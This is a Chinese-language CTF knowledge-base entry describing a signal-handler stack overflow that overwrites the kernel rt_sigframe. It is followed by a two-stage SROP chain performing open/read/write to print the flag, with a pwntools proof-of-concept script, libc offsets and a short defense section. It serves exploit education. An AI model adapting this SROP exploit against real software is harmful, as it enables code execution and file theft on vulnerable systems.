---
id: ctf-pwn-signal-handler-rt-sigframe-srop-orw
title: Signal handler 栈溢出覆盖 rt_sigframe：SROP 两阶段 open/read/write 读 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: signal-handler-rt-sigframe-srop-orw
aliases:
- shadow_signal
- Pwn2
- signal handler SROP
- rt_sigframe 覆盖
- SigreturnFrame
- 两阶段 ORW
tags:
- ctf
- pwn
- srop
- sigreturn
- signal-handler
- stack-overflow
- orw
- libc-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:50:54+08:00'
  notes: 已对照原文 Pwn2/shadow_signal 核对：gift 泄 stdout、坏地址触发 SIGSEGV、handler read(0,rbp-0x110,0x500)、0x110+p64(0)+restorer(0x42520)+SigreturnFrame、syscall_ret 0x91316、.bss 多段 restorer+frame open/read/write/exit 均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

程序先泄露 libc 指针，再读取一个地址并 `puts(ptr)`；传入坏地址主动触发 `SIGSEGV` 进入 signal handler。handler 中存在 `read(0, rbp-0x110, 0x500)` 栈溢出，可覆盖内核 signal frame（`rt_sigframe`），保留 `__restore_rt` 后构造 `SigreturnFrame`，用 SROP 先 `read(0, .bss, 0x800)` 布置第二阶段，再在 `.bss` 上用连续 sigframe 执行 `open("flag") -> read(fd) -> write(1)` 读出 flag。

## 原理

- **泄露与触发**：程序打印 `stdout` 等 libc 指针，计算 libc base；随后 `puts(用户提供的地址)`，传入 `0xdeadbeef` 触发 `SIGSEGV`，内核保存现场并跳转到注册的 signal handler。
- **handler 溢出**：handler 中 `read(0, rbp-0x110, 0x500)` 允许覆盖保存的 rbp、返回地址以及 handler 栈帧上方的内核 `rt_sigframe`。返回时执行 `__restore_rt`（`rt_sigreturn` 系统调用），内核从栈上的 `rt_sigframe` 恢复寄存器，因此攻击者控制 `rax/rdi/rsi/rdx/rip/rsp`。
- **SROP 第一段**：构造 `SigreturnFrame` 使 `rax=0`（read）、`rdi=0`、`rsi=bss`、`rdx=0x800`、`rip=syscall; ret`、`rsp=bss`；sigreturn 后执行 `read(0,bss,0x800)`，把第二阶段读到 `.bss`。
- **第二阶段链**：在 `.bss` 上按 `restorer + SigreturnFrame` 重复布置：`open("flag",0,0)`、`read(fd, buf, 0x100)`、`write(1, buf, 0x100)`、`exit(0)`。每个 sigframe 的 `rip` 设为 `syscall; ret`、`rsp` 指向下一块 frame 的起始；`syscall; ret` 返回到 `__restore_rt`，内核再次 sigreturn 恢复下一组寄存器，形成连续的 syscall 链。
- **关键细节**：handler 的 `[rbp+8]` 是 `__restore_rt`，不能改坏；溢出 payload 从 `buf+0x120` 开始放 fake sigframe，`buf+0x118` 保留 restorer。`sigframe` 的 `rsp` 要指向下一块 frame 的 `restorer` 地址，保证 `syscall; ret` 后能继续 sigreturn。
- **为什么有效**：`rt_sigreturn` 完全信任内核栈上的 frame，而 handler 的读溢出允许写该 frame；SROP 不需要逐个找 gadget，只要一个 `syscall; ret` + restorer。

## 触发条件

- 程序注册了 signal handler，且 handler 内有栈溢出/可写内核 sigframe 的读。
- 可主动触发信号（非法地址、除零、`raise` 等）进入 handler。
- 有 libc 泄露可定位 `__restore_rt`、`syscall; ret`。
- NX 开启（不能直接执行 shellcode），但 SROP 只需 syscall。
- 目标文件路径已知（如 `flag`/`/flag`），或可用 openat/read/write 组合。

## 利用步骤

1. 读取程序泄露的 libc 指针，计算 base；定位 `__restore_rt`（如 0x42520）与 `syscall; ret`（如 0x91316）。
2. 发送非法地址触发 `SIGSEGV`，等待 handler 的 `signal` 提示。
3. 发送第一阶段 payload：`b'A'*0x110 + p64(0) + p64(restorer) + SigreturnFrame(read(0,bss,0x800))`。
4. 发送第二阶段链：在 `.bss` 布置多个 `restorer + SigreturnFrame`，依次 open/read/write/exit；路径字符串放在 `.bss` 后部。
5. 接收输出，提取 flag。

## PoC

```python
from pwn import *

bss = 0x405000

def sigframe(rax, rdi, rsi, rdx, rip, rsp):
    f = SigreturnFrame()
    f.rax, f.rdi, f.rsi, f.rdx = rax, rdi, rsi, rdx
    f.rip, f.rsp = rip, rsp
    return bytes(f)

def stage1(libc_base):
    restorer = libc_base + 0x42520
    syscall_ret = libc_base + 0x91316
    return (b"A" * 0x110 + p64(0) + p64(restorer) +
            sigframe(0, 0, bss, 0x800, syscall_ret, bss))

def stage2(libc_base, path=b"flag"):
    restorer = libc_base + 0x42520
    syscall_ret = libc_base + 0x91316
    path_addr, buf_addr = bss + 0x500, bss + 0x600

    chain = p64(restorer) + sigframe(2, path_addr, 0, 0, syscall_ret, bss + 0x100)
    chain = chain.ljust(0x100, b"\x00")
    chain += p64(restorer) + sigframe(0, 3, buf_addr, 0x100, syscall_ret, bss + 0x200)
    chain = chain.ljust(0x200, b"\x00")
    chain += p64(restorer) + sigframe(1, 1, buf_addr, 0x100, syscall_ret, bss + 0x300)
    chain = chain.ljust(0x300, b"\x00")
    chain += p64(restorer) + sigframe(60, 0, 0, 0, syscall_ret, 0)
    chain = chain.ljust(0x500, b"\x00")
    return chain + path + b"\x00"
```

## 变体与关联

- 若无 libc 泄露，可用 `syscall; ret` 的固定地址（非 PIE）或 `vsyscall`；若 Full RELRO/PIE，需要先泄露。
- 若 handler 没有直接读溢出，可通过 `sigaltstack`/`ucontext` 劫持、信号竞争、嵌套信号等变体。
- 若 seccomp 限制 open，可改用 openat/read/write 或已打开 fd；若 NX 关闭也可直接 shellcode。
- 关联：signal handler 栈溢出、SROP、rt_sigframe、ORW 卡。

## 检测与防御

- 编译时启用 `-fstack-protector`、`-z noexecstack`、FORTIFY；signal handler 内不要用不安全的 `read` 到固定栈缓冲。
- 使用 `sigaltstack` + `SA_ONSTACK` 并限制 handler 栈大小；对 handler 输入做长度校验。
- 启用 seccomp 限制 `rt_sigreturn` 之外的 syscall；SROP 依赖 sigreturn，可用 seccomp 过滤异常 sigreturn。
- 检测：进程频繁收到 SIGSEGV 后立即大量 read、`.bss` 出现 sigframe 模式、`rt_sigreturn` 调用异常。
